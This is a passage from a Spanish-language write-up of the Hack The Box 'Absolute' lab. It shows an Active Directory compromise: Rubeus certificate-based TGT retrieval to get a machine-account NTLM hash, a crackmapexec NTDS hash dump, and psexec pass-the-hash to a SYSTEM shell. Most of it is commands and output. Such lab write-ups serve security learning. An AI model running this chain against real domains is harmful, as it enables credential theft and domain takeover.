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
/l+ECAgfQ /password:"9750712d-6e61-49c1-9c56-0155c340e95f" /getcredentials /show
```

Esto genera un certificado y gracias a Rubeus puedo obtener el hash NTLM del Account System para dumpearme el NTDS

```null
.\Rubeus.exe asktgt /user:DC$ /certificate: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
QMCxfdCr0xeYaK/l+ECAgfQ /password:"9750712d-6e61-49c1-9c56-0155c340e95f" /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT 

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[*] Using domain controller: fe80::1466:aa88:3eb5:1da4%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      Lmh0Yg==

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  2/2/2023 7:39:08 PM
  EndTime                  :  2/3/2023 5:39:08 AM
  RenewTill                :  2/9/2023 7:39:08 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  85UBVgo1SzWsl+7VAlBA5Q==
  ASREP (key)              :  F661CCA9E971AC54A3E52A76C13E532E

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
```

Con crackmapexec me dumpeo el NTDS

```null
crackmapexec smb 10.10.11.181 -u 'DC$' -H 'A7864AB463177ACB9AEC553F18F42577' --ntds
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577 
SMB         10.10.11.181    445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.10.11.181    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.11.181    445    DC               Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
SMB         10.10.11.181    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.181    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
SMB         10.10.11.181    445    DC               J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
SMB         10.10.11.181    445    DC               M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
SMB         10.10.11.181    445    DC               D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
SMB         10.10.11.181    445    DC               s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
SMB         10.10.11.181    445    DC               j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
SMB         10.10.11.181    445    DC               n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
SMB         10.10.11.181    445    DC               m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
SMB         10.10.11.181    445    DC               l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
SMB         10.10.11.181    445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         10.10.11.181    445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         10.10.11.181    445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         10.10.11.181    445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         10.10.11.181    445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         10.10.11.181    445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
SMB         10.10.11.181    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
SMB         10.10.11.181    445    DC               [+] Dumped 18 NTDS hashes to /root/.cme/logs/DC_10.10.11.181_2023-02-03_032818.ntds of which 17 were added to the database
```

Con Psexec hago PassThehash

```null
psexec.py absolute.htb/Administrator@10.10.11.181 -hashes :1f4a6093623653f6488d5aa24c75f2ea
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.181.....
[*] Found writable share ADMIN$
[*] Uploading file vsTUVNbJ.exe
[*] Opening SVCManager on 10.10.11.181.....
[*] Creating service zgDD on 10.10.11.181.....
[*] Starting service zgDD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3406]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::19c
   IPv6 Address. . . . . . . . . . . : dead:beef::1466:aa88:3eb5:1da4
   Link-local IPv6 Address . . . . . : fe80::1466:aa88:3eb5:1da4%11
   IPv4 Address. . . . . . . . . . . : 10.10.11.181
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:cdb8%11
                                       10.10.10.2

C:\Windows\system32> 
```